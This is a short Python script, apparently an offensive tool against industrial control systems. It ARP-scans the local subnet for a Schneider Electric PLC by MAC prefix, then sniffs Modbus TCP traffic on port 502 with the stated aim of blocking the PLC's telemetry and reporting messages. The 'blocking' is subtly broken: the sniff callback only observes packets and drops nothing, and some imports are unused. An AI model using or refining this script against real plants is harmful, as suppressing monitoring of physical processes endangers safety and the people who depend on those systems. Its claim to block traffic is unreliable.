from scapy.all import ARP, Ether, srp, sniff, conf
import netifaces
from pyModbusTCP.client import ModbusClient
import os

# Function to find the PLC's IP address by scanning the network
def find_plc_ip(target_mac_prefix="00:80:F4"):  # Schneider Electric MAC Prefix
    print("[*] Scanning for PLC on the network...")

    # Get the default gateway to determine subnet
    gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
    subnet = gateway_ip.rsplit('.', 1)[0] + '.0/24'

    # Send ARP request to find devices in the network
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)

    for snd, rcv in ans:
        if rcv.hwsrc.startswith(target_mac_prefix):
            print(f"[+] PLC Detected: IP {rcv.psrc}, MAC {rcv.hwsrc}")
            return rcv.psrc  # Return the detected PLC IP

    print("[-] No PLC found on the network.")
    return None

# Function to block telemetry by intercepting and dropping Modbus packets
def block_reporting_messages(plc_ip):
    print(f"[*] Blocking telemetry messages to/from PLC: {plc_ip}")

    # Define sniffing filter for Modbus TCP packets (port 502 is Modbus default)
    filter_rule = f"tcp and host {plc_ip} and port 502"

    def packet_dropper(packet):
        """Intercepts packets and prevents them from reaching their destination."""
        print(f"[!] Blocking packet: {packet.summary()}")  # Log blocked packets
        return None  # Dropped packet; do not forward

    # Start sniffing and blocking Modbus communication
    sniff(filter=filter_rule, prn=packet_dropper, store=0)

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        block_reporting_messages(plc_ip)
    else:
        print("[-] Exiting: PLC not found.")